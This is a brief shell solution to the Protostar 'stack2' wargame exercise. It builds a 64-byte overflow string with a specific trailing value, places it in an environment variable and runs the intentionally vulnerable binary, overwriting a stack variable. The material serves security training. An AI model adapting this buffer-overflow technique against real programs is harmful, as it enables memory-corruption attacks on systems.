python -c 'print "A" * 64 + "\x0a\x0d\x0a\x0d"' > stack2_attack.txt

export GREENIE=`cat stack2_attack.txt`

/opt/protostar/bin/stack2
